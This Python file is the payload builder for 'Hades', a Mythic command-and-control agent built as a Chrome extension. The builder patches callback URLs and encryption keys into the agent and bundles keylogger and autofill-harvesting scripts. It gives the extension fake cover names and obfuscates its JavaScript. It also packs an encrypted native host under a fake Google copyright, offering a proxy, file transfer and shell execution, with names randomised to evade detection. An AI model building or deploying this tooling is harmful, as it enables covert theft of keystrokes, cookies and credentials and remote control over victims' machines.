import json
import os
import random
import re
import string
import subprocess
import tempfile
import zipfile
import io
from mythic_container.PayloadBuilder import (
    PayloadType, BuildParameter, BuildParameterType,
    BuildResponse, BuildStatus,
)
try:
    from mythic_container.PayloadBuilder import SupportedOS
    _CHROME_OS = SupportedOS.Chrome
except AttributeError:
    _CHROME_OS = "Chrome"

AGENT_CODE_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
    "agent_code",
)
_MYTHIC_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# Source filenames on disk (never change these)
_SRC_FILES = ["background.js", "keylogger.js", "autofill.js"]

# ── Filename & metadata randomisation ────────────────────────────────────────
# Plausible Chrome extension names/descriptions to blend in with real extensions
_COVER_NAMES = [
    ("Tab Manager Plus", "Manage and organize your browser tabs efficiently"),
    ("Dark Reader Helper", "Accessibility improvements for dark mode rendering"),
    ("Privacy Shield", "Enhanced privacy and tracking protection for Chrome"),
    ("Page Loader", "Optimises page loading performance and caching"),
    ("Session Sync", "Synchronise browser sessions across devices"),
    ("Clipboard Helper", "Advanced clipboard management for productivity"),
    ("Web Accelerator", "Speed up browsing with optimised resource loading"),
    ("Font Renderer", "Improved font rendering and text display"),
    ("Scroll Assist", "Smooth scrolling and navigation enhancements"),
    ("Cache Manager", "Intelligent cache management for faster browsing"),
]


def _strip_feature_section(src: str, tag: str) -> str:
    """Remove lines between # __BEGIN_{tag}__ and # __END_{tag}__ markers."""
    return re.sub(
        r'[ \t]*# __BEGIN_' + tag + r'__[ \t]*\n.*?[ \t]*# __END_' + tag + r'__[ \t]*\n',
        '', src, flags=re.DOTALL)


def _make_proxy_bootstrap(core_path: str, level: str = "standard",
                          features: str = "proxy_only"):
    """Prepare proxy_host_core.py for deployment.

    Strips unused feature sections, bakes in a random PSK, and optionally
    encrypts the result (SHA-256 CTR bootstrap). Returns (source, psk).

    level:
      none     — plaintext source, PSK injected; proxy_install.py re-encrypts on victim
      standard — SHA-256 CTR bootstrap; PSK shown in Mythic build output
    """
    import base64 as _b64, hashlib as _hs, struct as _st, zlib as _zl, secrets as _sec

    with open(core_path, "r", encoding="utf-8") as f:
        src = f.read()

    include_proxy = any(f in features for f in ("proxy", "all"))
    include_files = any(f in features for f in ("files", "all"))
    include_exec  = any(f in features for f in ("exec",  "all"))
    if not include_proxy: src = _strip_feature_section(src, "PROXY")
    if not include_files: src = _strip_feature_section(src, "FILE")
    if not include_exec:  src = _strip_feature_section(src, "EXEC")

    psk = _sec.token_hex(16)
    src = src.replace('"!!PSK!!"', f'"{psk}"', 1)

    if level == "none":
        return src, psk

    key     = _sec.token_bytes(32)
    raw     = _zl.compress(src.encode("utf-8"), level=9)
    blob    = bytearray()
    for i in range(0, len(raw), 32):
        ks    = _hs.sha256(key + _st.pack("<Q", i // 32)).digest()
        block = raw[i:i + 32]
        blob += bytes(a ^ b for a, b in zip(block, ks))
    enc_b64  = _b64.b64encode(bytes(blob)).decode()
    b64_body = "\n    ".join(f"'{enc_b64[i:i+76]}'" for i in range(0, len(enc_b64), 76))
    key_lines = "\n".join("    " + repr(key[i:i + 8]) for i in range(0, 32, 8))

    bootstrap = (
        "#!/usr/bin/env python3\n"
        "# Copyright (c) 2024 Google LLC\n"
        "# Chrome Extension Native Host v2.1.4\n"
        "import sys, zlib, base64 as _b, hashlib as _h, struct as _st\n\n"
        "_K = (\n" + key_lines + "\n)\n"
        "_P = _b.b64decode(\n    " + b64_body + "\n)\n\n"
        "def _dc(k, d):\n"
        "    r = bytearray()\n"
        "    for i in range(0, len(d), 32):\n"
        "        r += bytes(a ^ b for a, b in zip(\n"
        "            d[i:i+32], _h.sha256(k + _st.pack('<Q', i // 32)).digest()))\n"
        "    return bytes(r)\n\n"
        "if __name__ == '__main__':\n"
        "    exec(zlib.decompress(_dc(_K, _P)).decode(),\n"
        "         {'__name__': '__main__', '__file__': __file__})\n"
    )
    return bootstrap, psk


def _gen_proxy_identity(custom_host: str = "") -> tuple:
    """Return (host_name, script_filename) for the IP proxy native host.

    If custom_host is provided (e.g. 'com.apple.webkit.helper'), the script
    name is derived from the last two components. Otherwise both are random.
    """
    if custom_host:
        parts  = custom_host.strip().split(".")
        script = "_".join(parts[-2:]) + ".py" if len(parts) >= 2 else parts[-1] + ".py"
        return custom_host.strip(), script

    vendors  = ["google", "apple", "adobe", "microsoft", "dropbox"]
    products = ["chrome", "webkit", "reader", "edge", "desktop"]
    services = ["helper", "service", "bridge", "agent", "host"]
    vendor   = random.choice(vendors)
    product  = random.choice(products)
    service  = random.choice(services)
    return f"com.{vendor}.{product}.{service}", f"{product}_{service}.py"


def _rand_exe_name() -> str:
    """Random plausible Windows helper executable name — avoids static IOCs."""
    prefixes = ["chrome", "update", "helper", "sync", "util", "agent", "svc"]
    suffixes = ["helper", "service", "util", "host", "agent", "runner", "bridge"]
    style = random.randint(0, 2)
    if style == 0:
        return (random.choice(prefixes) + "_" +
                "".join(random.choices(string.ascii_lowercase + string.digits, k=4)) + ".exe")
    elif style == 1:
        return random.choice(prefixes) + "_" + random.choice(suffixes) + ".exe"
    else:
        return "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))) + ".exe"


def _rand_js_name() -> str:
    """Generate a random plausible JS filename like 'a3f9c1e2.js' or 'module_bf2a.js'."""
    styles = [
        lambda: "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 12))) + ".js",
        lambda: random.choice(["module", "worker", "lib", "core", "util", "helper", "vendor", "runtime"])
                + "_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(4, 8))) + ".js",
        lambda: random.choice(["content", "inject", "page", "frame", "loader", "init"])
                + "".join(random.choices(string.digits, k=random.randint(2, 4))) + ".js",
    ]
    return random.choice(styles)()


def _randomise_manifest(
    manifest_src: str,
    file_map,
    ext_name: str = "",
    ext_desc: str = "",
    selected_cmds = None,
    obf_level: str = "none",
) -> str:
    """Rewrite manifest.json with randomised filenames, cover identity, and
    minimal permissions based on selected commands."""
    m = json.loads(manifest_src)

    # Extension identity: use operator values or random cover
    if ext_name:
        m["name"] = ext_name
    else:
        cover_name, _ = random.choice(_COVER_NAMES)
        m["name"] = cover_name

    if ext_desc:
        m["description"] = ext_desc
    else:
        _, cover_desc = random.choice(_COVER_NAMES)
        m["description"] = cover_desc

    m["version"] = f"{random.randint(1,5)}.{random.randint(0,9)}.{random.randint(0,9)}"

    # ── Permission filtering: only request what selected commands need ────
    if selected_cmds:
        needed = set(_CORE_PERMISSIONS)
        for perm, cmds in _CMD_PERMISSIONS.items():
            if cmds & selected_cmds:
                needed.add(perm)
        # Keep only permissions that are both in the original manifest and needed
        original_perms = set(m.get("permissions", []))
        m["permissions"] = sorted(needed & original_perms)
    else:
        # Can't determine selection — keep all permissions
        pass

    # Randomise permission order at high obfuscation to prevent ordering IOCs
    if obf_level == "high":
        random.shuffle(m["permissions"])

    # Remap service_worker filename
    if "background" in m and "service_worker" in m["background"]:
        old = m["background"]["service_worker"]
        if old in file_map:
            m["background"]["service_worker"] = file_map[old]

    # Remap content_scripts filenames; drop entries for excluded files
    new_cs = []
    for cs in m.get("content_scripts", []):
        remapped = [file_map[f] for f in cs.get("js", []) if f in file_map]
        if remapped:
            cs["js"] = remapped
            new_cs.append(cs)
    m["content_scripts"] = new_cs

    return json.dumps(m, indent=2)

# ── Obfuscation presets ──────────────────────────────────────────────────────
_OBF_PRESETS = {
    "low": [
        "--compact", "true",
        "--string-array", "true",
        "--string-array-encoding", "rc4",
        "--identifier-names-generator", "hexadecimal",
        "--rename-globals", "true",
    ],
    "medium": [
        "--compact", "true",
        "--string-array", "true",
        "--string-array-encoding", "rc4",
        "--identifier-names-generator", "hexadecimal",
        "--rename-globals", "true",
        "--control-flow-flattening", "true",
        "--control-flow-flattening-threshold", "0.5",
        "--dead-code-injection", "true",
        "--dead-code-injection-threshold", "0.2",
        "--split-strings", "true",
        "--split-strings-chunk-length", "10",
    ],
    "high": [
        "--compact", "true",
        "--string-array", "true",
        "--string-array-encoding", "rc4",
        "--string-array-calls-transform", "true",
        "--string-array-wrappers-count", "3",
        "--string-array-wrappers-chained-calls", "true",
        "--string-array-wrappers-type", "function",
        "--string-array-threshold", "0.8",
        "--identifier-names-generator", "hexadecimal",
        "--rename-globals", "true",
        "--control-flow-flattening", "true",
        "--control-flow-flattening-threshold", "0.75",
        "--dead-code-injection", "true",
        "--dead-code-injection-threshold", "0.4",
        "--split-strings", "true",
        "--split-strings-chunk-length", "10",
        # --transform-object-keys and --numbers-to-expressions are intentionally
        # omitted: they break Web Crypto API calls (e.g. {name:"RSA-OAEP",hash:"SHA-1"})
        # and numeric constants used in the AES/HMAC byte-level crypto code.
    ],
}


_CMD_BLOCK_RE = re.compile(
    r"[ \t]*// __CMD__ ([^\n]+)\n(.*?)// __ENDCMD__\n?",
    re.DOTALL,
)

# Commands that require specific content scripts
_CONTENT_SCRIPT_CMDS = {
    "keylogger.js": {"keylog", "disable_keylog"},
    "autofill.js":  {"autofill", "disable_autofill"},
}

# Map each Chrome permission to the commands that require it.
# Permissions in _CORE_PERMISSIONS are always included (needed by the agent framework).
_CORE_PERMISSIONS = {"tabs", "storage", "activeTab", "scripting", "alarms"}

_CMD_PERMISSIONS = {
    "cookies":        {"dump_cookies", "session_export"},
    "identity":       {"sysinfo"},
    "history":        {"history"},
    "bookmarks":      {"bookmarks"},
    "management":     {"list_extensions", "exit_running", "exit_full"},
    "idle":           {"idle", "screenshot_all"},
    "clipboardRead":  {"clipboard"},
    "downloads":      {"download_history", "download_watch", "download_watch_stop",
                       "download_intercept_start", "download_intercept_stop"},
    "webRequest":     {"network_monitor_start", "network_monitor_stop"},
    "notifications":  {"notifications"},
    # nativeMessaging required for all native host commands
    "nativeMessaging": {"native_start", "native_stop",
                        "ip_proxy_start", "ip_proxy_stop",
                        "file_ls", "file_download", "file_upload",
                        "file_delete", "file_mkdir", "exec"},
}


def strip_unused_commands(js_src: str, selected_cmds) -> str:
    """Remove __CMD__/__ENDCMD__ blocks whose commands aren't in the selected set."""
    def _replacer(m: re.Match) -> str:
        tags = {t.strip() for t in m.group(1).split(",")}
        if tags & selected_cmds:
            return m.group(0)        # keep — at least one command selected
        return ""                    # strip entire block
    return _CMD_BLOCK_RE.sub(_replacer, js_src)


def obfuscate_js(js_code: str, level: str) -> str:
    """Run javascript-obfuscator on a JS string, return obfuscated code."""
    preset = _OBF_PRESETS.get(level)
    if not preset:
        return js_code

    tmp_in = tmp_out = None
    try:
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".js", delete=False, encoding="utf-8"
        ) as f:
            f.write(js_code)
            tmp_in = f.name

        tmp_out = tmp_in + ".obf.js"
        args = ["javascript-obfuscator", tmp_in, "--output", tmp_out] + preset

        result = subprocess.run(
            args, capture_output=True, text=True, timeout=180
        )
        if result.returncode != 0:
            raise RuntimeError(
                f"javascript-obfuscator exited {result.returncode}: {result.stderr[:500]}"
            )

        with open(tmp_out, "r", encoding="utf-8") as f:
            return f.read()
    finally:
        for p in (tmp_in, tmp_out):
            if p and os.path.exists(p):
                os.unlink(p)


class Hades(PayloadType):
    name             = "hades"
    file_extension   = "zip"
    author           = "@asaurusrex"
    supported_os     = [_CHROME_OS]
    wrapper          = False
    wrapped_payloads = []
    note             = "Hades — Chrome extension Mythic C2 agent (WebSocket + HTTP). Lab use only."
    supports_dynamic_loading = True   # enables command selection UI in payload builder
    mythic_encrypts       = True
    translation_container = None
    agent_icon_path            = os.path.join(_MYTHIC_DIR, "hades_icon.svg")
    dark_mode_agent_icon_path  = os.path.join(_MYTHIC_DIR, "hades_dark.svg")

    build_parameters = [
        BuildParameter(
            name="bg_filename",
            parameter_type=BuildParameterType.String,
            description="Filename for the background service worker (leave blank for random, e.g. 'sw.js')",
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="keylogger_filename",
            parameter_type=BuildParameterType.String,
            description="Filename for the keylogger content script (leave blank for random, e.g. 'input.js')",
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="autofill_filename",
            parameter_type=BuildParameterType.String,
            description="Filename for the autofill content script (leave blank for random, e.g. 'forms.js')",
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="obfuscate",
            parameter_type=BuildParameterType.ChooseOne,
            description="JavaScript obfuscation level applied to all extension code at build time",
            choices=["none", "low", "medium", "high"],
            default_value="medium",
        ),
        BuildParameter(
            name="extension_name",
            parameter_type=BuildParameterType.String,
            description="Chrome extension display name (leave blank for a random cover name)",
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="extension_description",
            parameter_type=BuildParameterType.String,
            description="Chrome extension description (leave blank for a random cover description)",
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="native_host_features",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "Features to compile into the native messaging host.\n"
                "none:             No native host — extension-only payload\n"
                "proxy_only:       IP proxy relay (ip_proxy_start/stop)\n"
                "files_only:       File browser/downloader/uploader\n"
                "exec_only:        Shell command execution (exec)\n"
                "proxy_and_files:  Proxy + file browser\n"
                "proxy_and_exec:   Proxy + shell exec\n"
                "files_and_exec:   File browser + shell exec\n"
                "all:              Proxy + file browser + shell exec"
            ),
            choices=["none", "proxy_only", "files_only", "exec_only",
                     "proxy_and_files", "proxy_and_exec", "files_and_exec", "all"],
            default_value="proxy_only",
        ),
        BuildParameter(
            name="proxy_host_level",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "Native host encryption level.\n"
                "standard: SHA-256 CTR bootstrap; PSK shown in build output "
                "(use this PSK in ip_proxy_start).\n"
                "none: Plaintext source; PSK generated by install.py at install time."
            ),
            choices=["standard", "none"],
            default_value="standard",
        ),
        BuildParameter(
            name="native_host_name",
            parameter_type=BuildParameterType.String,
            description=(
                "Native messaging host name registered with Chrome "
                "(e.g. 'com.apple.webkit.helper'). "
                "Leave blank for a random camouflage name."
            ),
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="socks_psk",
            parameter_type=BuildParameterType.String,
            description=(
                "PSK for the Go SOCKS5 native binary (socks_start). "
                "Must match the value the Go binary was compiled with "
                "(-X main.PSK=<value>). Leave blank to use the default "
                "placeholder (only safe if Go binary was also compiled with defaults)."
            ),
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="deploy_label",
            parameter_type=BuildParameterType.String,
            description=(
                "Optional deployment label baked into the payload (e.g. 'target-laptop-1'). "
                "Appears in the Domain field of the Mythic callback to identify where the "
                "extension was deployed when the disk path is unknown."
            ),
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="windows_launcher",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "Windows native host launcher (only relevant for Windows targets).\n"
                "none: VBScript fallback — Chrome → wscript.exe → python.exe\n"
                "go_launcher: Pre-compiled Go launcher included in ZIP — "
                "Chrome → <random>.exe → python.exe (signed). "
                "Requires Go in the Mythic container (see Dockerfile). "
                "Launcher name is randomised on every build to avoid static IOCs."
            ),
            choices=["none", "go_launcher"],
            default_value="none",
            required=False,
        ),
    ]

    c2_profiles = ["websocket", "http"]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)

        try:
            aes_psk_b64 = ""
            rsa_pub_b64 = ""
            ws_url      = ""
            http_url    = ""
            is_eke      = False

            for c2 in (self.c2info or []):
                try:
                    profile_name = c2.c2profile.get("name", "") if isinstance(c2.c2profile, dict) else ""
                except Exception:
                    profile_name = ""
                params   = c2.parameters or {}
                host     = str(params.get("callback_host", "")).rstrip("/")
                port     = str(params.get("callback_port", "80")).strip()
                endpoint = str(params.get("ENDPOINT_REPLACE", "")).strip().lstrip("/")
                path     = "/" + endpoint if endpoint else "/"

                # Detect EKE (RSA key exchange) vs PSK mode
                enc_check_raw = params.get("encrypted_exchange_check", False)
                profile_eke = str(enc_check_raw).lower() in ("true", "t", "1", "yes")

                # Read crypto key — RSA pub key when EKE, AES PSK otherwise
                # AESPSK can be: dict {enc_key, dec_key, value}, plain string, or absent
                aespsk = params.get("AESPSK", {})
                key_b64 = ""
                if isinstance(aespsk, dict):
                    key_b64 = (aespsk.get("enc_key") or aespsk.get("dec_key")
                               or aespsk.get("value") or "")
                elif isinstance(aespsk, str) and aespsk:
                    key_b64 = aespsk

                # Debug: log what we extracted (visible in build message)
                _aespsk_debug = (
                    f"AESPSK type={type(aespsk).__name__} "
                    f"keys={list(aespsk.keys()) if isinstance(aespsk, dict) else 'N/A'} "
                    f"enc_check={enc_check_raw!r} eke={profile_eke} "
                    f"key_len={len(key_b64)} key_preview={key_b64[:40]}..."
                )

                if key_b64:
                    # RSA public keys (SPKI DER, base64) are always >100 chars.
                    # AES-256 keys are 44 chars (32 bytes). If Mythic gave us a
                    # short key despite encrypted_exchange_check=true, the C2
                    # profile hasn't generated an RSA key pair — fall back to PSK.
                    if profile_eke and len(key_b64) > 100 and not rsa_pub_b64:
                        rsa_pub_b64 = key_b64
                        is_eke = True
                    elif not aes_psk_b64:
                        aes_psk_b64 = key_b64
                        if profile_eke:
                            _aespsk_debug += (
                                " | WARNING: encrypted_exchange_check=true but "
                                f"key is only {len(key_b64)} chars (AES, not RSA). "
                                "C2 profile needs to be restarted with EKE enabled. "
                                "Falling back to PSK mode."
                            )

                if profile_name == "websocket" and host and not ws_url:
                    if not host.startswith("ws"):
                        host = "ws://" + host
                    ws_url = f"{host}:{port}{path}"

                elif profile_name == "http" and host and not http_url:
                    if not host.startswith("http"):
                        host = "http://" + host
                    http_url = f"{host}:{port}{path}"

            if not ws_url and not http_url:
                raise ValueError(
                    "No C2 profile selected, or callback_host not set in the profile. "
                    "Add a websocket or http C2 profile and configure callback_host."
                )

            # ── Patch background.js ───────────────────────────────────────
            bg_path = os.path.join(AGENT_CODE_DIR, "background.js")
            with open(bg_path, "r", encoding="utf-8") as f:
                bg_src = f.read()

            # Generate native host identity — needed now so bg_src can be patched
            custom_nh_name             = (self.get_parameter("native_host_name") or "").strip()
            nh_host_name, nh_script_name = _gen_proxy_identity(custom_nh_name)

            bg_src = bg_src.replace("AES_PSK_PLACEHOLDER",       aes_psk_b64 if not is_eke else "")
            bg_src = bg_src.replace("RSA_PUB_PLACEHOLDER",       rsa_pub_b64 if is_eke else "")
            bg_src = bg_src.replace("PAYLOAD_UUID_HERE",          self.uuid)
            bg_src = bg_src.replace("WS_URL_PLACEHOLDER",         ws_url)
            bg_src = bg_src.replace("HTTP_URL_PLACEHOLDER",       http_url)
            bg_src = bg_src.replace("IP_PROXY_HOST_PLACEHOLDER",  nh_host_name)
            socks_psk = (self.get_parameter("socks_psk") or "").strip() or "NATIVE_HOST_PSK_PLACEHOLDER"
            bg_src = bg_src.replace("NATIVE_HOST_PSK_PLACEHOLDER", socks_psk)

            import datetime
            deploy_label = (self.get_parameter("deploy_label") or "").strip()
            build_time   = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
            bg_src = bg_src.replace("DEPLOY_LABEL_PLACEHOLDER", deploy_label)
            bg_src = bg_src.replace("BUILD_TIME_PLACEHOLDER",   build_time)

            # ── Modular command inclusion ─────────────────────────────────
            # Strip code for commands not selected in the Mythic UI.
            # self.commands may be a CommandList with .get_commands(), a plain
            # iterable, or absent entirely depending on mythic_container version.
            selected_cmds = None
            _cmds_debug = ""
            try:
                cmds_raw = self.commands
                _cmds_debug = f"type={type(cmds_raw).__name__}"
                cmd_list = None
                if cmds_raw is not None:
                    if hasattr(cmds_raw, "get_commands"):
                        cmd_list = cmds_raw.get_commands()
                    elif hasattr(cmds_raw, "__iter__"):
                        cmd_list = list(cmds_raw)
                if cmd_list:
                    selected_cmds = set()
                    for c in cmd_list:
                        if hasattr(c, "cmd"):
                            selected_cmds.add(c.cmd)
                        elif isinstance(c, str):
                            selected_cmds.add(c)
                        else:
                            selected_cmds.add(str(c))
                    _cmds_debug += f" resolved={sorted(selected_cmds)}"
                else:
                    _cmds_debug += " resolved=EMPTY/NONE"
            except Exception as e:
                _cmds_debug += f" error={e}"

            if selected_cmds is not None and len(selected_cmds) > 0:
                selected_cmds |= {"sleep", "exit_running", "exit_full"}
                bg_src = strip_unused_commands(bg_src, selected_cmds)
                cmds_stripped = True
            else:
                # Could not determine selection — keep ALL commands
                selected_cmds = {"ALL (no stripping)"}
                cmds_stripped = False

            # ── Filename randomisation ────────────────────────────────────
            # Operator can pin any filename; blanks get a unique random name.
            user_bg  = (self.get_parameter("bg_filename") or "").strip()
            user_kl  = (self.get_parameter("keylogger_filename") or "").strip()
            user_af  = (self.get_parameter("autofill_filename") or "").strip()

            def _ensure_js(name: str) -> str:
                return name if name.endswith(".js") else name + ".js"

            used_names = set()
            def _unique_rand() -> str:
                while True:
                    n = _rand_js_name()
                    if n not in used_names:
                        used_names.add(n)
                        return n

            # Determine which content scripts are needed based on selected commands
            included_src_files = ["background.js"]
            for cs_file, required_cmds in _CONTENT_SCRIPT_CMDS.items():
                if not selected_cmds or (required_cmds & selected_cmds):
                    included_src_files.append(cs_file)

            file_map = {}
            for src_name, user_val in [
                ("background.js", user_bg),
                ("keylogger.js",  user_kl),
                ("autofill.js",   user_af),
            ]:
                if src_name not in included_src_files:
                    continue   # skip content scripts for unselected commands
                if user_val:
                    final = _ensure_js(user_val)
                    used_names.add(final)
                    file_map[src_name] = final
                else:
                    file_map[src_name] = _unique_rand()

            # ── Obfuscation ───────────────────────────────────────────────
            obf_level = self.get_parameter("obfuscate")

            # Prepare all files — read, patch where needed, obfuscate JS
            zip_entries = {}  # filename-in-zip → content string
            for src_name in included_src_files:
                if src_name == "background.js":
                    content = bg_src
                else:
                    fpath = os.path.join(AGENT_CODE_DIR, src_name)
                    with open(fpath, "r", encoding="utf-8") as f:
                        content = f.read()

                if obf_level != "none":
                    content = obfuscate_js(content, obf_level)

                zip_entries[file_map[src_name]] = content

            # Rewrite manifest.json with randomised names and cover identity
            manifest_path = os.path.join(AGENT_CODE_DIR, "manifest.json")
            with open(manifest_path, "r", encoding="utf-8") as f:
                manifest_src = f.read()
            user_ext_name = (self.get_parameter("extension_name") or "").strip()
            user_ext_desc = (self.get_parameter("extension_description") or "").strip()
            zip_entries["manifest.json"] = _randomise_manifest(
                manifest_src, file_map,
                ext_name=user_ext_name,
                ext_desc=user_ext_desc,
                selected_cmds=selected_cmds if cmds_stripped else None,
                obf_level=obf_level,
            )

            # ── Bundle native host ────────────────────────────────────────
            nh_features  = self.get_parameter("native_host_features") or "proxy_only"
            nh_level     = self.get_parameter("proxy_host_level")     or "standard"
            native_psk   = ""

            if nh_features != "none":
                nh_dir       = os.path.normpath(os.path.join(
                    os.path.dirname(__file__), "..", "..", "native_host"))
                core_path    = os.path.join(nh_dir, "proxy_host_core.py")
                install_path = os.path.join(nh_dir, "install.py")

                native_src, native_psk = _make_proxy_bootstrap(
                    core_path, level=nh_level, features=nh_features)

                # For level=none the ZIP ships the plaintext core; install.py encrypts it
                # on the victim and produces nh_script_name. For standard the ZIP ships
                # the pre-encrypted bootstrap directly as nh_script_name.
                if nh_level == "none":
                    zip_entries["native_host/proxy_host_core.py"] = native_src
                else:
                    zip_entries[f"native_host/{nh_script_name}"] = native_src

                with open(install_path, "r", encoding="utf-8") as f:
                    install_src = f.read()
                # Substitute placeholders so install.py knows the right filenames
                install_src = install_src.replace("IP_PROXY_HOST_PLACEHOLDER", nh_host_name)
                install_src = install_src.replace("IP_PROXY_SCRIPT_PLACEHOLDER", nh_script_name)
                zip_entries["native_host/install.py"] = install_src

            # ── Windows Go launcher (optional, requires Go in container) ──
            win_launcher = self.get_parameter("windows_launcher") or "none"
            launcher_note = ""
            if nh_features != "none" and win_launcher == "go_launcher":
                launcher_src_dir = os.path.normpath(
                    os.path.join(os.path.dirname(__file__), "..", "..", "native_host", "launcher_windows"))
                exe_name = _rand_exe_name()
                with tempfile.TemporaryDirectory() as td:
                    out_exe = os.path.join(td, exe_name)
                    env = os.environ.copy()
                    env.update({"GOOS": "windows", "GOARCH": "amd64", "CGO_ENABLED": "0"})
                    r = subprocess.run(
                        ["go", "build", "-ldflags=-s -w", "-trimpath",
                         "-o", out_exe, "."],
                        env=env, capture_output=True, text=True, timeout=120,
                        cwd=launcher_src_dir)  # must run from module root where go.mod lives
                    if r.returncode != 0:
                        raise RuntimeError(
                            f"Go launcher build failed (is Go installed in the container?):\n{r.stderr[:600]}")
                    with open(out_exe, "rb") as f:
                        zip_entries[f"native_host/{exe_name}"] = f.read()
                launcher_note = f"\nWindows launcher: {exe_name} (Chrome → launcher.exe → python.exe)"

            # ── Build Chrome extension zip ────────────────────────────────
            zip_buf = io.BytesIO()
            with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
                for fname, content in zip_entries.items():
                    zf.writestr(fname, content)

            active_transports = " + ".join(filter(None, [
                f"WS={ws_url}"    if ws_url   else "",
                f"HTTP={http_url}" if http_url else "",
            ]))
            crypto_mode = "EKE (RSA key exchange)" if is_eke else f"PSK ({aes_psk_b64[:16]}...)"

            excluded_cs = [f for f in ("keylogger.js", "autofill.js")
                           if f not in included_src_files]
            files_note = f"Files: {len(zip_entries)} in zip"
            if excluded_cs:
                files_note += f" (excluded: {', '.join(excluded_cs)})"

            fn_map_lines = "\n".join(
                f"    {orig:20s} → {rand}"
                for orig, rand in sorted(file_map.items())
            )
            filename_map_note = f"\nJS filename map:\n{fn_map_lines}"

            if nh_features == "none":
                psk_note = "\nNative host: not included (extension-only build)"
            elif nh_level == "standard":
                psk_note = (
                    f"\nNative host: {nh_host_name} ({nh_script_name})"
                    f"\nPSK (copy before closing this window): {native_psk}"
                    f"\n  → ip_proxy_start url=wss://<c2>/proxy-ws psk={native_psk}"
                )
            else:
                psk_note = (
                    f"\nNative host: {nh_host_name} ({nh_script_name})"
                    "\nPSK: generated by install.py at install time"
                )

            resp.payload       = zip_buf.getvalue()
            resp.status        = BuildStatus.Success
            resp.build_message = (
                f"Hades built. UUID={self.uuid} | {active_transports} | "
                f"Crypto: {crypto_mode} | Obfuscation: {obf_level} | "
                f"Commands: {len(selected_cmds)} selected "
                f"({'stripped' if cmds_stripped else 'all kept'}) | {files_note}"
                f"{filename_map_note}"
                f"{psk_note}{launcher_note}\n"
                f"DEBUG crypto: {_aespsk_debug}\n"
                f"DEBUG cmds: {_cmds_debug}"
            )

        except Exception as e:
            resp.build_stderr  = str(e)
            resp.build_message = "Build failed: " + str(e)

        return resp
